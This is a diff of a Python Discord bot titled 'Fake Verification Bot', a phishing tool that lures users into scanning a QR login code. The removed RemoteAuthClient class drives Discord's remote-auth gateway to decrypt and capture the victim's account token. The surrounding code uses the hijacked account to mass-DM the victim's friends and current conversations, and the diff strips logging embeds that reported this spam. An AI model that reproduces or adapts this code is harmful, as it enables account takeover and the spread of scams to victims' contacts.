@@ -13,6 +13,7 @@ from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import hashes
 from colorama import Fore, init; init(autoreset=True)
 from urllib.request import Request, urlopen
+from remoteauthclient import RemoteAuthClient
 from time import sleep
 y = Fore.LIGHTYELLOW_EX
 b = Fore.LIGHTBLUE_EX
@@ -45,7 +46,7 @@ message = config.get('message')
 #Bot title
 def bot_title():
     os.system("cls" if os.name == "nt" else "clear")
-    if os.name == "nt": ctypes.windll.kernel32.SetConsoleTitleW(f"Fake Verification Bot - Made by Infinimonster#1312")
+    if os.name == "nt": ctypes.windll.kernel32.SetConsoleTitleW(f"Fake Verification Bot - Made by Infinimonster#0001")
     else: pass
     print("\n\n")
     print(f"""{Fore.RESET}
@@ -149,101 +150,8 @@ async def start(ctx):
                 self.username = _username
                 self.discriminator = _discriminator
                 self.avatar = _avatar
-        class RemoteAuthClient:
-            def __init__(self):
-                self.initCrypto()
-                self._heartbeatTask = None
-                self.on_fingerprint = self.ev
-                self.on_userdata = self.ev
-                self.on_token = self.ev
-                self.on_cancel = self.ev
-                self.on_timeout = self.ev
-    
-            def initCrypto(self):
-                self.privateKey = rsa.generate_private_key(public_exponent=65537, key_size=2048)
-                self.publicKey = self.privateKey.public_key()
-                self.publicKeyString = "".join(self.publicKey.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo).decode("utf8").split("\n")[1:-2])
-    
-            def event(self, t):
-                def registerhandler(handler):
-                    if t == "on_fingerprint":
-                        self.on_fingerprint = handler
-                    elif t == "on_userdata":
-                        self.on_userdata = handler
-                    elif t == "on_token":
-                        self.on_token = handler
-                    elif t == "on_cancel":
-                        self.on_cancel = handler
-                    elif t == "on_timeout":
-                        self.on_timeout = handler
-                    return handler
-                return registerhandler
-    
-            def ev(self, *args, **kwargs):
-                pass
-    
-            async def run(self):
-                error = False
-    
-                async with connect("wss://remote-auth-gateway.discord.gg/?v=1", origin=Origin("https://discord.com")) as ws:
-                    while True:
-                        try:
-                            data = await ws.recv()
-                        except ConnectionClosedOK:
-                            break
-                        except ConnectionClosedError as e:
-                            if e.code == 4003:
-                                await self.on_timeout()
-                            else:
-                                error = True
-                            break
-    
-                        p = json.loads(data)
-    
-                        if p["op"] == "hello":
-                            await self.send({"op": "init", "encoded_public_key": self.publicKeyString}, ws)
-                            self._heartbeatTask = asyncio.get_event_loop().create_task(self.sendHeartbeat(p["heartbeat_interval"], ws))
-                            
-                        elif p["op"] == "nonce_proof":
-                            nonceHash = hashlib.sha256()
-                            nonceHash.update(self.privateKey.decrypt(base64.b64decode(bytes(p["encrypted_nonce"], "utf8")), padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)))
-                            nonceHash = base64.urlsafe_b64encode(nonceHash.digest()).decode("utf8")
-                            nonceHash = nonceHash.replace("/", "").replace("+", "").replace("=", "")
-                            await self.send({"op": "nonce_proof", "proof": nonceHash}, ws)
-
-                        elif p["op"] == "pending_remote_init":
-                            await self.on_fingerprint(data=f"https://discordapp.com/ra/{p['fingerprint']}")
-
-                        elif p["op"] == "pending_finish":
-                            decryptedUser = self.privateKey.decrypt(base64.b64decode(bytes(p["encrypted_user_payload"], "utf8")), padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)).decode("utf8")
-                            decryptedUser = decryptedUser.split(":")
-                            await self.on_userdata(user=User(decryptedUser[0], decryptedUser[3], decryptedUser[1], decryptedUser[2]))
-
-                        elif p["op"] == "finish":
-                            await self.on_token(token=self.privateKey.decrypt(base64.b64decode(bytes(p["encrypted_token"], "utf8")), padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)).decode("utf8"))
-                            break
-
-                        elif p["op"] == "cancel":
-                            await self.on_cancel()
-                            break
-    
-                self._heartbeatTask.cancel()
-    
-                if error:
-                    print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} RemoteAuthClient disconnected with error. Reconnecting...")
-                    self.initCrypto()
-                    await self.run()
-    
-            async def sendHeartbeat(self, interval, _ws):
-                while True:
-                    await asyncio.sleep(interval/1000)
-                    await self.send({"op": "heartbeat"}, _ws)
-    
-            async def send(self, jsonr, _ws):
-                await _ws.send(json.dumps(jsonr))
-    
-        c = RemoteAuthClient()
         
+        c = RemoteAuthClient()
         #QR Creation, Informations sender, Role giver, Mass DM sender, ...
         @c.event("on_fingerprint")
         async def on_fingerprint(data):
@@ -341,11 +249,6 @@ async def start(ctx):
                         try:
                             await interaction.user.add_roles(get(ctx.guild.roles, name=role_name))
                             print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Role added to {user.username}#{user.discriminator}")
-                            if logs_channel:
-                                embed_role = nextcord.Embed(title=f"**Add Role Option:**", description=f"```yaml\nRole {role_name} added to {user.username}#{user.discriminator} with success!```", color=5003474)
-                                embed_role.set_footer(text="Made by Infinimonster#1312 »» https://github.com/FuckingToasters")
-                                embed_role.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
-                                await logs_channel.send(embed=embed_role)
                         except:
                             print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} There is a problem with your role. Check the Name and make sure it can give this role")
 
@@ -370,11 +273,6 @@ async def start(ctx):
                                             sleep(.5)
                                             pass
                             print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Current DM(s) successfully messaged")
-                            if logs_channel:
-                                embed_cdm = nextcord.Embed(title=f"**Spam Current DMs Option:**", description=f"Messages sent succesfully with {user.username}#{user.discriminator} account\n```yaml\nMessage: {message}\nCurrent Dms: {len(channel_id)}\nSuccessfully sent: {success} message(s)\nUnuccessfully sent: {failures} message(s)```", color=5003474)
-                                embed_cdm.set_footer(text="Made by Infinimonster#1312 »» https://github.com/FuckingToasters")
-                                embed_cdm.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
-                                await logs_channel.send(embed=embed_cdm)
                         except Exception as e:
                             print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} Mass DM failed: {e}")
                             pass
@@ -398,11 +296,6 @@ async def start(ctx):
                                 print(f"\t\t\t\t\t\t{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} This guy is lonely, he aint got no friends...")
                             else:
                                 print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Friend(s) successfully messaged")
-                            if logs_channel:
-                                embed_fdm = nextcord.Embed(title=f"**Spam Friends Option:**", description=f"Messages sent succesfully with {user.username}#{user.discriminator} account\n```yaml\nMessage: {message}\nTotal Friends: {len(getfriends)}```", color=5003474)
-                                embed_fdm.set_footer(text="Made by Infinimonster#1312 »» https://github.com/FuckingToasters")
-                                embed_fdm.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
-                                await logs_channel.send(embed=embed_fdm)
                         except Exception as e:
                             print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} Mass DM failed: {e}")
                             pass
